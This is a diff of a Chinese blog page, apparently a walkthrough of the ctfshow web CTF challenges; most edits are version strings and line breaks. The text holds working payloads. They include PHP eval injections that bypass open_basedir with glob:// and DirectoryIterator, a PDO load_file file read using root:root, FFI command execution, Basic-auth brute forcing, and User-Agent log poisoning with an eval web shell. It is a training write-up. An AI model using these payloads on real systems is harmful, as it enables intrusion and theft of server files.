@@ -14,7 +14,7 @@
 <meta property="og:description" content="ctfshow-web入门全解  重新走一遍ctfshow,顺便记录下wp">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-10-24T08:40:00.000Z">
-<meta property="article:modified_time" content="2025-10-26T10:35:57.454Z">
+<meta property="article:modified_time" content="2025-10-26T10:59:05.565Z">
 <meta property="article:author" content="Pr1nt">
 <meta property="article:tag" content="WP">
 <meta property="article:tag" content="web">
@@ -24,15 +24,15 @@
 <link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
 
 
-<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1761475999801">
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1761476370959">
 
-<link rel="stylesheet" href="/css/style.css?v=1761475999801">
+<link rel="stylesheet" href="/css/style.css?v=1761476370959">
 
 
 
 
     
-        <link rel="stylesheet" href="/custom.css?v=1761475999801">
+        <link rel="stylesheet" href="/custom.css?v=1761476370959">
     
 
 
@@ -42,7 +42,7 @@
 <script src="/lib/lax.min.js" async></script>
 
 
-<script async src="/js/app.js?v=1761475999801"></script>
+<script async src="/js/app.js?v=1761476370959"></script>
 
  
 
@@ -118,7 +118,7 @@
 </div>
 
 
-	<script async src="/js/search.js?v=1761475999802"></script>
+	<script async src="/js/search.js?v=1761476370960"></script>
 
 
 
@@ -420,7 +420,8 @@
 <p>不写了,这里直接点下面的hint就能看到,提一嘴如果由于js导致看不了源码可以点一下url再进行<code>f12</code>或者<code>ctrl+u</code></p>
 <h2 id="爆破">爆破</h2>
 <h3 id="web21">web21</h3>
-<p>点开发现要输用户名和密码,抓包发现有个<code>Authorization: Basic YWRtaW46MTIzNDU2</code>,解码后面的是<code>admin:123456</code>,这里就可以直接爆破了使用burp&gt;Intruder&gt;payload处理先前缀一个<code>admin:</code>,再<code>base64-encode</code>,最后把下面的URL编码取消,就可以爆了</p>
+<p>点开发现要输用户名和密码,抓包发现有个<code>Authorization: Basic YWRtaW46MTIzNDU2</code>,解码后面的是<code>admin:123456</code>,这里就可以直接爆破了<br>
+使用burp&gt;Intruder&gt;payload处理先前缀一个<code>admin:</code>,再<code>base64-encode</code>,最后把下面的URL编码取消,就可以爆了</p>
 <h3 id="web22">web22</h3>
 <p>爆破域名,好像环境坏了,直接交flag吧</p>
 <h3 id="web23">web23</h3>
@@ -442,7 +443,8 @@ Intruder&gt;日期&gt;从19800101爆到20201231,格式选下面的自填<code>yy
 <blockquote>
 <p>直接看hint吧,看不懂的看我rce全解那篇文章,很全了,web118到web121看我环境变量全解那集</p>
 </blockquote>
-<p>web41这个位置肯定是放错了,应该放55-57这个位置的着重讲一下web71开始,这里与前面就不是一个难度了</p>
+<p>web41这个位置肯定是放错了,应该放55-57这个位置的<br>
+着重讲一下web71开始,这里与前面就不是一个难度了</p>
 <h3 id="web71">web71</h3>
 <p>源码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
@@ -457,14 +459,18 @@ payload:<code>c=include('/flag.txt');exit();</code></p>
 <blockquote>
 <p>说下这题为什么放这了,因为这个与web75一样,比web73和web74多了一个open_basedir的限制,估计放在web73之前就是scandir能用</p>
 </blockquote>
-<p>当试图用上一题的payload的时候，出现<code>include(/flag.txt): failed to open stream: No such file or directory in /var/www/html/index.php(19) : eval()'d code</code><br>
+<p>当试图用上一题的payload的时候，出现<br>
+<code>include(/flag.txt): failed to open stream: No such file or directory in /var/www/html/index.php(19) : eval()'d code</code><br>
 猜测是<code>open_basedir</code>限制了访问区域,这里可以用<code>glob:///*</code>进行读取的绕过<br>
 <code>c=var_export(scandir('glob:///*'));exit();</code></p>
 <blockquote>
 <p>从后面来的,这里虽然scandir能用,但其实也可以当作被ban了使用web75的方法</p>
 </blockquote>
-<p>这里<code>var_export</code>与<code>print_r</code>的效果大致相同发现根目录下有<code>flag0.txt</code>但下一步要想读到flag,就很麻烦了<br>
-wp给的是使用了uaf的脚本<code>UAF(UseAfterFree)</code>是pwn里面的一个方法简单说下原理吧,payload可以用web75这题的</p>
+<p>这里<code>var_export</code>与<code>print_r</code>的效果大致相同<br>
+发现根目录下有<code>flag0.txt</code>但下一步要想读到flag,就很麻烦了<br>
+wp给的是使用了uaf的脚本<br>
+<code>UAF(UseAfterFree)</code>是pwn里面的一个方法<br>
+简单说下原理吧,payload可以用web75这题的</p>
 <h4 id="UAF">UAF</h4>
 <p>UAF是一种内存管理漏洞,发生在程序释放了某块内存后,继续访问或使用这块内存,此时,内存可能已被重新分配给其他对象,导致未定义行为,可能被攻击者利用</p>
 <p>如果程序在内存释放后继续访问，可能触发UAF漏洞，导致：访问被新对象占用的内存,可被攻击者利用</p>
@@ -497,17 +503,22 @@ wp给的是使用了uaf的脚本<code>UAF(UseAfterFree)</code>是pwn里面的一
 </ul>
 <p>注:以上来源于<code>grok</code>,我不是打pwn的,具体这一块我不懂</p>
 <h3 id="web75">web75</h3>
-<p>这题开始由于include也被禁了，所以要想一些奇技淫巧了第一步还是glob获取文件名,但与上一题不同</p>
+<p>这题开始由于include也被禁了，所以要想一些奇技淫巧了<br>
+第一步还是glob获取文件名,但与上一题不同</p>
 <p>wp的payload是</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-<p>这里如果使用<code>var_export(glob('/*'))</code>会出现false,应该是<code>glob()</code>函数权限不够无法读到根目录那么就要使用glob伪协议来进行读取,这里就使用了<code>DirectoryIterator()</code>这个类来进行读取,还是挺考验对类的了解的,纯盲解的话应该是翻php手册找哪个类能读取而且没被禁魔术方法调用toString是输出类对象的值,但我测试一下直接<code>echo($f)</code>也是可行的</p>
+<p>这里如果使用<code>var_export(glob('/*'))</code>会出现false,应该是<code>glob()</code>函数权限不够无法读到根目录<br>
+那么就要使用glob伪协议来进行读取,这里就使用了<code>DirectoryIterator()</code>这个类来进行读取,还是挺考验对类的了解的,纯盲解的话应该是翻php手册找哪个类能读取而且没被禁魔术方法调用toString是输出类对象的值,但我测试一下直接<code>echo($f)</code>也是可行的</p>
 <p>然后我在这里又测了一下直接使用<code>glob:///</code>读取flag,结果发现存在<code>open_basedir</code></p>
 <h4 id="PDO">PDO</h4>
-<p>主要是第二步这里先放出wp里的payload</p>
+<p>主要是第二步<br>
+这里先放出wp里的payload</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">try</span> &#123;<br>	<span class="hljs-variable">$dbh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>);<br>	<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dbh</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>)&#123;<br>		<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&quot;|&quot;</span>; <br>	&#125;<br>	<span class="hljs-variable">$dbh</span> = <span class="hljs-literal">null</span>;<br>&#125;<br><span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>
-<p>接下来先讲原理,这里主要逻辑是<code>new</code>了一个PDO对象(<code>PHP Data Objects</code>),并用<code>localhost</code>的主机连接到用户名和密码都为<code>root</code>的数据库<code>ctftraining</code>,下一行是执行sql语句进行查询并遍历结果,然后输出结果并在最后添加<code>|</code>,最后关闭数据库连接,catch是与try对应的,负责异常时的情况,那么显然,这里不try一下也不catch也是完全可以的,甚至可以将关闭数据库这一步都删了,因为我们只是需要使用sql语句进行查询接着输出即可也就是</p>
+<p>接下来先讲原理,这里主要逻辑是<code>new</code>了一个PDO对象(<code>PHP Data Objects</code>),并用<code>localhost</code>的主机连接到用户名和密码都为<code>root</code>的数据库<code>ctftraining</code>,下一行是执行sql语句进行查询并遍历结果,然后输出结果并在最后添加<code>|</code>,最后关闭数据库连接,catch是与try对应的,负责异常时的情况,那么显然,这里不try一下也不catch也是完全可以的,甚至可以将关闭数据库这一步都删了,因为我们只是需要使用sql语句进行查询接着输出即可<br>
+也就是</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$dbh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dbh</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>)&#123;<br>	<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]); <br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>
-<p>那么<code>load_file</code>为什么可以读到文件呢,因为只要sql数据库有读取文件的权限,就能成功读取,这是sql函数,不是php函数,所以php的disable禁不掉他那么我们知道了payload的原理,就需要知道payload的组成了,最主要的就是<code>mysql:host=localhost;dbname=ctftraining</code>这一段<br>
+<p>那么<code>load_file</code>为什么可以读到文件呢,因为只要sql数据库有读取文件的权限,就能成功读取,这是sql函数,不是php函数,所以php的disable禁不掉他<br>
+那么我们知道了payload的原理,就需要知道payload的组成了,最主要的就是<code>mysql:host=localhost;dbname=ctftraining</code>这一段<br>
 php的PDO函数支持多种数据库,这里列出一下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">MySQL : (<span class="hljs-string">&#x27;mysql:host=localhost;port=3306;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br>PostgreSQL : (<span class="hljs-string">&#x27;pgsql:host=localhost;port=5432;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;postgres&#x27;</span>, <span class="hljs-string">&#x27;postgres&#x27;</span>);<br>SQLite : (<span class="hljs-string">&#x27;sqlite:/var/db/ctftraining.db&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>SQL Server : (<span class="hljs-string">&#x27;sqlsrv:Server=localhost,1433;Database=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;sa&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>);<br>Oracle : (<span class="hljs-string">&#x27;oci:dbname=//localhost:1521/ctftraining&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;oracle&#x27;</span>);<br>MariaDB是MySQL的一个分支,与mysql一致<br></code></pre></td></tr></table></figure>
 <p>那么我们可以一个个试出数据库类型,但数据库名字又是怎么得到的呢</p>
@@ -517,7 +528,11 @@ php的PDO函数支持多种数据库,这里列出一下</p>
 <h3 id="web76">web76</h3>
 <p>和上一题一样,flag名字变<code>flag36d.txt</code>了而已</p>
 <h3 id="web77">web77</h3>
-<p>flag名字变<code>flag36x.txt</code>了试图用上一题的payload,但是报错了,应该是这题没给pdo_mysql扩展,也就是使用数据库来读取这一招不好使了注意到题目给出环境为php7.4版本,肯定是不会白给的对吧问了一下grok,给出了一个<code>SplFileObject</code>(SPL类绕过),是与使用<code>DirectoryIterator</code>读文件名类似的方法但是由于存在<code>open_basedir</code>的限制所以不可行</p>
+<p>flag名字变<code>flag36x.txt</code>了<br>
+试图用上一题的payload,但是报错了,应该是这题没给pdo_mysql扩展,也就是使用数据库来读取这一招不好使了<br>
+注意到题目给出环境为php7.4版本,肯定是不会白给的对吧<br>
+问了一下grok,给出了一个<code>SplFileObject</code>(SPL类绕过),是与使用<code>DirectoryIterator</code>读文件名类似的方法<br>
+但是由于存在<code>open_basedir</code>的限制所以不可行</p>
 <blockquote>
 <p>这里我想到了之前那个也存在open_basedir限制的web72,那个是用的uaf,试了一下用web75的payload,结果好使</p>
 </blockquote>
@@ -529,11 +544,14 @@ php的PDO函数支持多种数据库,这里列出一下</p>
 <p>这里我试了一下直接<code>cat</code>,但是不好使,<code>ls -la</code>看一下发现权限不够,只能使用<code>/readflag</code></p>
 <p>这里讲一下FFI的原理</p>
 <h4 id="FFI">FFI</h4>
-<p>FFI是<code>PHP 7.4</code>引入的一个扩展,允许php直接调用c语言函数这里先是使用<code>FFI::cdef</code>声明了一个c函数,payload这里就是定义了C的<code>system</code>函数,接受一个C字符串（<code>const char *</code>）作为命令然后调用FFI对象就成功执行任意命令了,唯一的问题是没有回显,我们需要将结果输出到<code>1.txt</code></p>
+<p>FFI是<code>PHP 7.4</code>引入的一个扩展,允许php直接调用c语言函数<br>
+这里先是使用<code>FFI::cdef</code>声明了一个c函数,payload这里就是定义了C的<code>system</code>函数,接受一个C字符串（<code>const char *</code>）作为命令<br>
+然后调用FFI对象就成功执行任意命令了,唯一的问题是没有回显,我们需要将结果输出到<code>1.txt</code></p>
 <p>php手册: <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ffi.cdef.php">FFI::cdef</a></p>
 <h3 id="web118-web122">web118-web122</h3>
 <h4 id="环境变量的利用">环境变量的利用</h4>
-<p>看我的环境变量全解那里<a href="http://blog.pr1nt.icu/2024/07/28/pwd/">从0到1,学习环境变量的利用方法</a></p>
+<p>看我的环境变量全解那里<br>
+<a href="http://blog.pr1nt.icu/2024/07/28/pwd/">从0到1,学习环境变量的利用方法</a></p>
 <h3 id="web124">web124</h3>
 <blockquote>
 <p>非常规rce</p>
@@ -545,7 +563,8 @@ php的PDO函数支持多种数据库,这里列出一下</p>
 <h3 id="web79">web79</h3>
 <p>过滤了php换data伪协议</p>
 <h3 id="web80">web80</h3>
-<p>这里wp给的是改UA头给日志写入恶意代码然后包含这个日志即可<code>/?file=/var/log/nginx/access.log</code><br>
+<p>这里wp给的是改UA头给日志写入恶意代码然后包含这个日志即可<br>
+<code>/?file=/var/log/nginx/access.log</code><br>
 <code>User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0&lt;?php eval($_GET[1]);?&gt;</code><br>
 第二种方法是大写PHP绕过过滤写个<code>pHP://input</code>,然后用POST发带恶意命令的包即可</p>
 <h3 id="web81">web81</h3>
@@ -608,7 +627,7 @@ php的PDO函数支持多种数据库,这里列出一下</p>
 </div>
   
   
-    <script async src="/js/copy-codeblock.js?v=1761475999525"></script>
+    <script async src="/js/copy-codeblock.js?v=1761476370815"></script>
   
 
   
